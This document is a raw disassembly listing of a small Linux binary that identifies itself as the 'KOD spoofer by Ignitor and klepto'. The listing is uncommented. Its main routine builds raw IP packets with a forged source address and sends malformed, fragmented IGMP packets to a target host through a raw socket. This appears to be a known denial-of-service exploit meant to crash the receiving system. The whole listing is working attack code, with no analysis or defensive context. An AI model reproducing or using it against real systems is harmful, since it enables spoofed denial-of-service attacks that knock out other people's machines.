xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
sub esp, 8
cmp dword [obj.completed.4], 0
jne 0x804857d
jmp 0x8048553
mov eax, dword [obj.p.3]
lea edx, [eax + 4]
mov dword [obj.p.3], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.3]
cmp dword [eax], 0
jne 0x8048541
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048573
add esp, 0xfffffff4
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.4], 1
leave
ret
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x80485a9
add esp, 0xfffffff8
push obj.object.11
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
leave
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x8048971
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x8048965
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 0x18
add esp, 0xfffffff4
mov eax, dword [arg_8h]
push eax
call sym.imp.gethostbyname
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x80485e7
mov eax, 0xffffffff
jmp 0x8048610
add esp, 0xfffffffc
mov eax, dword [var_4h]
mov edx, dword [eax + 0xc]
push edx
mov eax, dword [var_4h]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
push eax
lea eax, [s1]
push eax
call sym.imp.memcpy
add esp, 0x10
mov edx, dword [s1]
mov eax, edx
jmp 0x8048610
lea esi, [esi]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
call 0x80483f4
pop ebx
add ebx, 0x1664
cmp dword [ebx + 0x40], 0
je 0x8048409
call loc.imp.__gmon_start__
lea esi, [esi]
call sym.frame_dummy
call loc.gcc2_compiled._2
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 0x618
mov dword [var_28h], 0
cmp dword [argv], 2
jg 0x8048660
add esp, 0xfffffff4
push str.KOD_spoofer_by_Ignitor_and_klepto_n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff8
mov eax, dword [envp]
mov edx, dword [eax]
push edx
push str.Usage:__s__src___dst__n
call sym.imp.printf
add esp, 0x10
mov eax, 1
jmp 0x80488e0
lea esi, [esi]
add esp, 0xfffffff4
mov eax, dword [envp]
add eax, 8
mov edx, dword [eax]
push edx
call loc.gcc2_compiled._4
add esp, 0x10
mov eax, eax
mov dword [var_1ch], eax
add esp, 0xfffffff4
mov eax, dword [envp]
add eax, 4
mov edx, dword [eax]
push edx
call loc.gcc2_compiled._4
add esp, 0x10
mov eax, eax
mov dword [var_20h], eax
add esp, 0xfffffffc
push 0x5dc
push 0
lea eax, [s]
push eax
call sym.imp.memset
add esp, 0x10
lea eax, [s]
mov dword [var_14h], eax
lea eax, [s]
lea edx, [eax + 0x14]
mov dword [var_18h], edx
mov eax, dword [var_1ch]
mov dword [var_ch], eax
mov word [var_10h], 2
mov eax, dword [var_14h]
and byte [eax], 0xf0
or byte [eax], 5
mov eax, dword [var_14h]
and byte [eax], 0xf
or byte [eax], 0x40
mov eax, dword [var_14h]
mov byte [eax + 1], 0
add esp, 0xfffffff4
push 0x2ab5
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 2], ax
add esp, 0xfffffff4
push 0xbe08
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 4], ax
mov eax, dword [var_14h]
mov byte [eax + 8], 0x40
mov eax, dword [var_14h]
mov byte [eax + 9], 2
add esp, 0xfffffff8
push 0x14
mov eax, dword [var_14h]
push eax
call sym.in_chksum
add esp, 0x10
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 0xa], ax
mov eax, dword [var_14h]
mov edx, dword [var_20h]
mov dword [eax + 0xc], edx
mov eax, dword [var_14h]
mov edx, dword [var_1ch]
mov dword [eax + 0x10], edx
add esp, 0xfffffffc
push 0xff
push 3
push 2
call sym.imp.socket
add esp, 0x10
mov eax, eax
mov dword [var_24h], eax
cmp dword [var_24h], 0xffffffff
jne 0x8048780
mov eax, 1
jmp 0x80488e0
lea esi, [esi]
add esp, 0xfffffffc
mov eax, dword [envp]
add eax, 8
mov edx, dword [eax]
push edx
mov eax, dword [envp]
add eax, 4
mov edx, dword [eax]
push edx
push str.Sending_IGMP_packets:__s_____s_n
call sym.imp.printf
add esp, 0x10
mov dword [var_2ch], 0
lea esi, [esi]
cmp dword [var_2ch], 1
jle 0x80487c0
jmp 0x80488d8
nop
lea esi, [esi]
mov dword [var_30h], 0xdc
add esp, 0xfffffff4
push 0x73a
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 6], ax
mov dword [var_28h], 0
add esp, 0xfffffff8
push 0x10
lea edx, [var_10h]
mov eax, edx
push eax
push 0
mov eax, dword [var_30h]
push eax
lea eax, [s]
push eax
mov eax, dword [var_24h]
push eax
call sym.imp.sendto
add esp, 0x20
mov eax, eax
cmp eax, 0xffffffff
jne 0x8048830
add esp, 0xfffffff4
push str.Error_sending_packet
call sym.imp.perror
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
nop
add esp, 0xfffffff4
mov eax, dword [var_14h]
movzx edx, word [eax + 6]
push edx
call sym.imp.ntohs
add esp, 0x10
mov eax, eax
cmp ax, 0x2000
jne 0x8048850
jmp 0x80488d0
mov dword [var_30h], 0x5dc
cmp dword [var_28h], 0
jne 0x8048878
add esp, 0xfffffff4
push 0x2681
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 6], ax
jmp 0x80488ab
add esp, 0xfffffff4
add esp, 0xfffffff4
mov eax, dword [var_14h]
movzx edx, word [eax + 6]
push edx
call sym.imp.ntohs
add esp, 0x10
mov eax, eax
lea edx, [eax - 0xb9]
movzx eax, dx
push eax
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 6], ax
add esp, 0xfffffff8
push 0x14
mov eax, dword [var_14h]
push eax
call sym.in_chksum
add esp, 0x10
mov eax, eax
mov edx, dword [var_14h]
mov word [edx + 0xa], ax
inc dword [var_28h]
jmp 0x80487e7
lea esi, [esi]
inc dword [var_2ch]
jmp 0x80487b0
mov eax, 1
jmp 0x80488e0
nop
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
call 0x8048988
pop ebx
add ebx, 0x10d0
nop
call loc.gcc2_compiled._1
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
mov edx, dword [arg_ch]
xor ecx, ecx
mov word [var_2h], 0
cmp edx, 1
jg 0x8048900
jmp 0x8048911
lea esi, [esi]
mov eax, dword [arg_8h]
movzx ebx, word [eax]
add ecx, ebx
add dword [arg_8h], 2
add edx, 0xfffffffe
jmp 0x80488f6
cmp edx, 1
jne 0x8048924
mov eax, dword [arg_8h]
mov bl, byte [eax]
mov byte [var_2h], bl
movzx eax, word [var_2h]
add ecx, eax
mov eax, ecx
sar eax, 0x10
mov ebx, ecx
movzx ebx, bx
lea ecx, [ebx + eax]
mov eax, ecx
sar eax, 0x10
add ecx, eax
mov eax, ecx
not eax
mov word [var_2h], ax
movzx ebx, word [var_2h]
mov eax, ebx
jmp 0x8048948
mov ebx, dword [var_18h]
leave
ret
jmp dword [reloc.perror]
jmp dword [reloc.sendto]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.ntohs]
jmp dword [reloc.printf]
jmp dword [reloc.memcpy]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.exit]
jmp dword [reloc.htons]
jmp dword [reloc.memset]
jmp dword [reloc.socket]
